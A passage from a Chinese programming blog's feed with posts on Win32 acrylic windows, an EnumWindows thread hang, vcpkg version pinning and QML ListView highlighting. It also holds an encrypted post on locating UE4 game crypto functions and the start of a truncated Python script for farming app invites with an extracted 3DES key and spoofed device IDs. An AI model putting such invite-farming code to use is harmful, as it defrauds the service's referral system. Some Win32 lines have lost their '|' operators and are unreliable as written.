class="line"></span><br><span class="line"><span class="comment">// 定义窗口类名和标题</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> g_szClassName[] = <span class="string">&quot;myWindowClass&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> g_szTitle[] = <span class="string">&quot;亚克力效果示例&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义消息处理函数</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(msg)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> WM_CREATE:</span><br><span class="line">            <span class="comment">// 在窗口创建时设置亚克力效果，颜色为半透明的白色（0x80FFFFFF）</span></span><br><span class="line">            <span class="built_in">EnableAcrylic</span>(hwnd, <span class="number">0x80FFFFFF</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">            <span class="built_in">DestroyWindow</span>(hwnd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">            <span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd, msg, wParam, lParam);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义全局变量</span></span><br><span class="line">HINSTANCE hInstance; <span class="comment">//程序实例句柄</span></span><br><span class="line">HWND hWnd; <span class="comment">//窗口句柄</span></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInst, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="type">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//初始化窗口类结构体</span></span><br><span class="line">    WNDCLASSEX wcex;</span><br><span class="line">    wcex.cbSize = <span class="built_in">sizeof</span>(WNDCLASSEX); <span class="comment">//结构体大小</span></span><br><span class="line">    wcex.style = CS_HREDRAW  CS_VREDRAW; <span class="comment">//窗口样式</span></span><br><span class="line">    wcex.lpfnWndProc = WndProc; <span class="comment">//窗口过程函数指针</span></span><br><span class="line">    wcex.cbClsExtra = <span class="number">0</span>; <span class="comment">//额外的类内存</span></span><br><span class="line">    wcex.cbWndExtra = <span class="number">0</span>; <span class="comment">//额外的窗口内存</span></span><br><span class="line">    wcex.hInstance = hInstance; <span class="comment">//程序实例句柄</span></span><br><span class="line">    wcex.hIcon = <span class="built_in">LoadIcon</span>(<span class="literal">NULL</span>, IDI_APPLICATION); <span class="comment">//窗口图标句柄</span></span><br><span class="line">    wcex.hCursor = <span class="built_in">LoadCursor</span>(<span class="literal">NULL</span>, IDC_ARROW); <span class="comment">//窗口光标句柄</span></span><br><span class="line">    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + <span class="number">1</span>); <span class="comment">//窗口背景画刷句柄</span></span><br><span class="line">    wcex.lpszMenuName = <span class="literal">NULL</span>; <span class="comment">//菜单资源名</span></span><br><span class="line">    wcex.lpszClassName = <span class="string">&quot;win&quot;</span>; <span class="comment">//窗口类名</span></span><br><span class="line">    wcex.hIconSm = <span class="built_in">LoadIcon</span>(<span class="literal">NULL</span>, IDI_APPLICATION); <span class="comment">//小图标句柄</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//注册窗口类</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">RegisterClassEx</span>(&amp;wcex))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">&quot;注册窗口类失败！&quot;</span>, <span class="string">&quot;错误&quot;</span>, MB_OK  MB_ICONERROR);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建窗口</span></span><br><span class="line">    hWnd = <span class="built_in">CreateWindowEx</span>(</span><br><span class="line">        WS_EX_APPWINDOW  WS_EX_LAYERED, <span class="comment">//扩展样式，包括应用程序窗口和分层窗口</span></span><br><span class="line">        <span class="string">&quot;win&quot;</span>, <span class="comment">//窗口类名</span></span><br><span class="line">        <span class="string">&quot;C++设置窗口亚克力效果&quot;</span>, <span class="comment">//窗口标题</span></span><br><span class="line">        WS_OVERLAPPEDWINDOW &amp; ~WS_THICKFRAME &amp; ~WS_MAXIMIZEBOX, <span class="comment">//基本样式，包括重叠式窗口，但不包括可调边框和最大化按钮</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment">//初始位置，默认居中</span></span><br><span class="line">        <span class="number">1000</span>, <span class="number">1000</span>, <span class="comment">//初始大小，按照宏定义的值</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">//父窗口句柄，无父窗口为NULL</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">//菜单句柄，无菜单为NULL</span></span><br><span class="line">        hInstance, <span class="comment">//程序实例句柄</span></span><br><span class="line">        <span class="literal">NULL</span>); <span class="comment">//附加数据，无附加数据为NULL</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!hWnd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">&quot;创建窗口失败！&quot;</span>, <span class="string">&quot;错误&quot;</span>, MB_OK  MB_ICONERROR);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">ShowWindow</span>(hWnd, nCmdShow);</span><br><span class="line">    <span class="built_in">UpdateWindow</span>(hWnd);</span><br><span class="line">    MSG msg;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">GetMessage</span>(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line">        <span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>EnumWindows问题</title>
      <link href="/6a3ede40ec7e/"/>
      <url>/6a3ede40ec7e/</url>
      
        <content type="html"><![CDATA[<p>笔者在日常开发中用到一种场景，该场景是启动一个子线程，在该线程里循环查找指定窗口是否存在。</p><p>里面用到了<code>EnumWindows</code>、<code>GetClassName</code>和<code>GetWindowText</code>的API。</p><p>从而引发了一个线程无法正常退出，使用<code>WaitForSingleObject</code>等待线程结束将永远无法结束的问题。</p><p>初步猜测可能是因为<code>EnumWindows</code>的回调函数中使用了<code>GetClassName</code>和<code>GetWindowText</code>的原因。这两个函数会给消息循环发消息，最后造成的阻塞问题。</p><p>这里贴出解决该问题的代码，当然此类问题最好使用其他的解决方案去规避。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">XXXXX::WaitXXXXXThread</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">MSG msg;</span><br><span class="line">BOOL bQuit = FALSE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!bQuit)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwRet = <span class="built_in">MsgWaitForMultipleObjects</span>(<span class="number">1</span>, &amp;m_tThread, FALSE, INFINITE, QS_ALLINPUT);</span><br><span class="line"><span class="keyword">if</span> (dwRet == WAIT_OBJECT_0 + <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">PeekMessage</span>(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, PM_REMOVE))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (msg.message == WM_QUIT)</span><br><span class="line">&#123;</span><br><span class="line">bQuit = TRUE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (dwRet == WAIT_OBJECT_0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">dwRet = <span class="built_in">GetLastError</span>();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>UE4引擎AES和HTTP请求函数寻找教程</title>
      <link href="/99b5cbee7acc/"/>
      <url>/99b5cbee7acc/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="d99f5638c879e3a0a6db98626c83b4198c1655e74f31ba21351d6985ccea98d0">22b67c60faae0a81b8d379477ae974cc3f6ad028dfabf29a6c7244f9c78d420fc9e50c4ef8a7cb78ff45eb6875ee216b687e4a3268bca44c0945de61f8061e221c4857208ea11f0713c16870c661bf790871a0b0602adebb37aa994c8db48eb15c0b9d3fa6512a13fba78fe2e125020f8237eaa78a5842518b16d5f1752c3acee726c779c0987f104fce50d769c2892d233e0e82a9c5a362b8b387ba60f8fe30326cd0744a5578f6a9fcd0b2bb91d754cdba376c0c1ce40b4ed53172676cf39c1ef991e0b16bdc1bb0fb50c303efd50684e507b097e298d98a0e0b7fdeff12a010a1aff3f0117b95141b48e3a9330093098c902a8d2cac4b8ea1481f2b80161ef4d2ec0316b0b0feda67538f2c61baf272005929141778df9cc3cb63d8bd9958147f75a1cb1c8c5dff0c3ba376d2882fd0288367bf573e622a143f791f07329e01ee51b3bd01be7991e06861a7ad26db268a7c1ed07c93789a6b1a9e06560f64dcd12be7b317f1aa70869e25474fe652f85fc81a58ef0f5165536cef76468f3a304ac95af14dda946880176012452efb55ffc7f92ad2f51ff80461d23ff4bbd5a46f9abad278a1326fb082ecef3c98c2add9ea194ac9a933153ca1eb11a5d7b185b2b55184dafa5f73923139c44327e9f049d387b9e6816158d8687dd7bd57ab0d884af1dfd766ca5c0c76e51b4e928dfeee5880eed40f52bab2c84c68c1fb4dafb6c8ff2a470bc491770fb6f0ac3effdb91446e4ce57e3661d8209c9a7d90b29b3c1764aa0ac0a95ada1ed4d8c2dea566d6eb4689f979d87e2969e814e02de1dfa7a4e1bf99b605a744e54693ed9a8061bdc8338986a865ffac54af646eeb0cdc9394c3d9af7f8ec0c347f0414ac00811e4294e7470dbf7323ec723e1eae33b9b0bf4b824007b8c27389bcccc37b98275049b7f0139a832038f859455aaa4ac661440a80e36bbf13cad3b6ec09e41f70a1dbff562e3495f0f5464ca6e702839200ed6052869458d2ded1a1e0279a4a5712c5a3ec666ea44c2aaafa4feab7cda150822fddc144f855ddf2facc5d09bb9e1fe380733c4101f52e9f6dda9d91e400595abf53aa45d55f4a4417c444039f3908baffbd4bde38f60ef4aaa327f4aa73f409a606c2bbd7088144230ba9996661bbd00eed59fd9a3d8d7ec15972d7de5c7ddb8e607ce1f1f48ff384d8f8d3b86f364c11c7e5406be109f4767b167bdc832ad8de303128d0b036b69fb2973bbf19fa5d0b9ef705a9aff30f9c6d9c755501c7498ac268fa2151d074b2ffd90fa1d475679580b85aa223e689478c080d8ec09b5c236cc203542c8989d4f8df07c7017c7e0fc1392f50a267c56a4bc351d4b689108e2c5b38185153d44913628ecc9ba7aeb2afcbe1104090afcecd7877d51885099ba17ef3a0298de1cff22e9e02e80e0c3c1c94f068fac5bc6421534e713b01d4ea8f50e1671e982b12c526b21a36bd7bacf344502479d99f35abf102afad5047a095974f9d812fce06835a59af96f243229590f7a478010a663c328dbdf12b5f50a7e7875d92ab25c725c6ceecd18194bc42d95129624acfb13c9aa3a96f81a3d250ff948a3f5a0c8a9a298491764dbe6b7bd6e63b4dd171b9ed1d57e38ca3902e5ff3c4fc330829c088e623fa9fc5d93f6ba912dfd5e87d2e145f7ec6e9b054701fbece595767fd49b43eb0cfa9973fde17982b7752d5c6f6a9da8dab00a4248385efdce3a06ea1561a85831a590a3ad615c8e857a69d812452e2a1eb7ef551acac02f3df1db474a23022f74e2a682088f7ca6d05e1769445021b8fe719ce95860c723ef0892572188f6e426b90b3ae219f6724d0c820b7081344433f03995a79b77b37ed93625bfb0a97e701ae62eba8ca3fbaf6df14b16c2cd037c3d50a8a010a9ad502b96159880f9d849ee07f07bb76ba28fbefed2a7f352e6231d2a36ec8ad43b2b012339fbd6a9dcbd750b76e0b0654a525ad5f573c6a92899bbc52b25f05fa283325cb958202db7805028e339e33f620cc06f3de3a53e0c8292c190d5886fd9f688980db69f5a545dcde98321ac9d1a4f3c46a56bed365ec6315f4b3994811359fbba2642cb608bd9e2927d06679ae3b5bec2eea2437fd20aa05e819035f510d4b57548b9b07a387c2d94122c054b025db5865917bb4f1251fff5ae65c8cc35c94cc73d7933af3c4a4e35a504c044d35df7a43201dd87791af9ce136282d6f8830c4159336269563c41218f8ccf5a5c63c209078e6fbac367bc7321d6fc878a5f39c89130aded4a7a39b256a8beefdcd3fd1a53b66766a6620f0cbd5cea2078f5e83e5fff1b26deafce2bdf9a1d00367f4a50c49ad4914bc0b59e7e9b39e5923c6598577eb0ae540a20290415efc80f38eedbb0042db1d05226c8e1a039d274679907b18fb8b780a3deed596ba229c785c9133042bc865817759f70bfd77f4aa7dcae7dc8d629aef7ee5fca14fe16e1eed7d72b238253ebeaa35ba435d6d3219c9a9d3b860bfe6caaf1f7ad89413ba74dd8cebf54fe9126aab0b945df7e6d4a676490ca4594c85c64c59cf6b9b50731f4dc1273b88f80c32df5fe728710fd5aa1a8fc31171d3fb511df44a3f471642d1f02b5e90b52dffe49a930e6d1463e999c7c096693edce421a4212561ed76ed99df5a89cf13ee252ba111067c8f04b4aec5723487ab756bd5133138c95f6baea173242f202837f48049e6674922a1748b30d126c92bd0a848cb8d0306cb7fd559050ad1485d1e3be98eb4f60870e04d9d66c7c2f66265ede3a5900be09975332d7ee6ec0c06739d265185f97a70f5eef6c5f7cff212c11fc8564ade5aaaa87a3ac9bb7387e0c73c59970e60c656f621e065064ab0da1765c8d4ce2066ba9c808d54789e9f2f0583160a2f5233fc8fc6b1ff812f1faeee88fc45db9f554c9a6fc34536eb68d3429046f3b4d5670613a4e8f277135d9171339e23c16fef718c286176d175751715df7e39bfba027f6542c2f1eeb255258053ee4ab5d8554151fb072d0192c2d26076198f09a5c1ece0b59dda11844476ccf2567435a3265fb17d8532e26ae10d9c99e5341dbd93e57b3a16c5814ae5cd27118f755da7ebdf424dc36ce0be532f2d78cf99c7bc7111f1032308f55a63d71ecee8012965ee94fb5832a039a80217722cf266771e557f3a0779569ac00a3e4db00e978f4b4795e781f33e71406a57ae0d90fc2e0b73c052bdda6ea9e70fff988ae584f4e1f42ade86df3a0134c4097bbd822040abd4fabfcc8c377ffb904c437921f207269597a3377945b199231e481704a8d1b9fbc71f123b2a2fdf944f5da4377b18907452385a941c97dc206fa5c8d4716</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vcpkg安装指定版本教程</title>
      <link href="/8ba971fca6f5/"/>
      <url>/8ba971fca6f5/</url>
      
        <content type="html"><![CDATA[<p>1、vcpkg\versions中查看所需要的版本号</p><p>2、在vcpkg.exe目录下创建vcpkg.json文件</p><p>3、编写文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;builtin-baseline&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span>  -- 随便输入一个，vcpkg会提示正确的，到时候修改就好了</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jsoncpp&quot;</span> -- 库名</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;overrides&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jsoncpp&quot;</span><span class="punctuation">,</span> -- 库名</span><br><span class="line">      <span class="attr">&quot;version-string&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.8.0&quot;</span> -- 需要的库版本</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS D:\sources\C++\vcpkg&gt; vcpkg install</span><br><span class="line">the top-level builtin-baseline (124) was not a valid commit sha: expected 40 hexadecimal characters.You can use the current commit as a baseline, <span class="built_in">which</span> is:</span><br><span class="line">        <span class="string">&quot;builtin-baseline&quot;</span>: <span class="string">&quot;eb8e75bb4f5b5f46f65cb10aa863285815c2b69c&quot;</span></span><br><span class="line">note: updating vcpkg by rerunning bootstrap-vcpkg may resolve this failure.</span><br></pre></td></tr></table></figure><p>4、在powershell中设置编译环境，这里示例为64位静态库版本 <code>$env:VCPKG_DEFAULT_TRIPLET = &#39;x64-windows-static&#39;</code></p><p>5、在vcpkg根目录下使用vcpkg install</p><p>6、完成后删除vcpkg.json文件</p>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ListView中highlight使用注意事项</title>
      <link href="/d376daaeba92/"/>
      <url>/d376daaeba92/</url>
      
        <content type="html"><![CDATA[<h2 id="解决方法一（推荐）："><a href="#解决方法一（推荐）：" class="headerlink" title="解决方法一（推荐）："></a>解决方法一（推荐）：</h2><p>将delegate元素背景色设置为半透明或全透明，这里需要注意如果你使用MouseArea来实现hover效果时，更需要注意onExited中，你是否将颜色设置成了不透明纯色。这也会导致highlight无法正常显示出来。</p><p><strong>示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">ListView &#123;</span><br><span class="line">    id: listView</span><br><span class="line">    anchors.fill: parent</span><br><span class="line">    anchors.bottomMargin: 60</span><br><span class="line">    model: ListModel &#123;</span><br><span class="line">        id: listViewModel</span><br><span class="line">    &#125;</span><br><span class="line">    delegate: listViewDelegate</span><br><span class="line">    ScrollBar.vertical: ScrollBar &#123;</span><br><span class="line">        anchors.left: parent.right</span><br><span class="line">    &#125;</span><br><span class="line">    header: listViewHeader</span><br><span class="line">    highlight: Rectangle &#123;</span><br><span class="line">        color: &quot;#f0f0f0&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    // 去除动画效果</span><br><span class="line">    highlightMoveDuration: 0</span><br><span class="line">    highlightResizeDuration: 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Component &#123;</span><br><span class="line">  id: listViewDelegate</span><br><span class="line">  Rectangle &#123;</span><br><span class="line">      height: 45</span><br><span class="line">      width: listView.width</span><br><span class="line">      // 注意这里需要设置为纯透明或半透明色，否则highlight元素会无法显示出来</span><br><span class="line">      color = &quot;#00000000&quot;</span><br><span class="line">      </span><br><span class="line">      MouseArea &#123;</span><br><span class="line">        // ...一些元素</span><br><span class="line">        anchors.fill: parent</span><br><span class="line">        hoverEnabled: true</span><br><span class="line">        cursorShape: Qt.PointingHandCursor</span><br><span class="line">        onEntered: &#123;</span><br><span class="line">            color = &quot;#f0f0f0&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        onExited: &#123;</span><br><span class="line">            // 注意这里也需要设置为纯透明或半透明色，否则highlight元素会无法显示出来</span><br><span class="line">            color = &quot;#00000000&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        onClicked: &#123;</span><br><span class="line">            listView.currentIndex = index</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解决方法二："><a href="#解决方法二：" class="headerlink" title="解决方法二："></a>解决方法二：</h2><p>如果delegate的元素含有背景色会导致highlight元素无法正常显示，只能用调整z轴坐标至ListView Z轴上方 + 半透明背景色才能达到高亮选中效果。</p><p><strong>示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">ListView &#123;</span><br><span class="line">    id: listView</span><br><span class="line">    anchors.fill: parent</span><br><span class="line">    anchors.bottomMargin: 60</span><br><span class="line">    model: ListModel &#123;</span><br><span class="line">        id: listViewModel</span><br><span class="line">    &#125;</span><br><span class="line">    delegate: listViewDelegate</span><br><span class="line">    ScrollBar.vertical: ScrollBar &#123;</span><br><span class="line">        anchors.left: parent.right</span><br><span class="line">    &#125;</span><br><span class="line">    header: listViewHeader</span><br><span class="line">    highlight: Rectangle &#123;</span><br><span class="line">        // 设置背景色为透明状态</span><br><span class="line">        color: &quot;#50f0f0f0&quot;</span><br><span class="line">        // 设置Z轴在当前listview上层</span><br><span class="line">        z: listView.z + 1</span><br><span class="line">    &#125;</span><br><span class="line">    // 去除动画效果</span><br><span class="line">    highlightMoveDuration: 0</span><br><span class="line">    highlightResizeDuration: 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Component &#123;</span><br><span class="line">  id: listViewDelegate</span><br><span class="line">  Rectangle &#123;</span><br><span class="line">      height: 45</span><br><span class="line">      width: listView.width</span><br><span class="line">      // 元素设置为纯透明背景色</span><br><span class="line">      color: &quot;#00000000&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> Qt 5.14.2 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>风车动漫刷邀请</title>
      <link href="/14af6e18de78/"/>
      <url>/14af6e18de78/</url>
      
        <content type="html"><![CDATA[<p>代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> json </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3 </span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad </span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"></span><br><span class="line">CODE = <span class="string">&quot;&quot;</span> <span class="comment"># 这里填写邀请码 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data</span>):</span><br><span class="line">     key = <span class="string">b&#x27;OW84U8Eerdb99rtsTXWSILDO&#x27;</span> </span><br><span class="line">     iv = <span class="string">b&#x27;SK8bncVu&#x27;</span> </span><br><span class="line">     cipher = DES3.new(key, DES3.MODE_CBC, iv) </span><br><span class="line">     padded_data = pad(data.encode(<span class="string">&quot;utf-8&quot;</span>), DES3.block_size) </span><br><span class="line">     cText = cipher.encrypt(padded_data) </span><br><span class="line">     <span class="keyword">return</span> base64.b64encode(cText).decode(<span class="string">&quot;utf-8&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_time</span>(): </span><br><span class="line">    now = datetime.now() </span><br><span class="line">    <span class="keyword">return</span> now.strftime(<span class="string">&quot;%Y-%m-%d&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">device_no</span>(): </span><br><span class="line">    chars = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    length = <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(chars[<span class="built_in">ord</span>(c) % <span class="built_in">len</span>(chars)] <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">str</span>(<span class="built_in">hash</span>(datetime.now())))[<span class="number">0</span>:length] </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 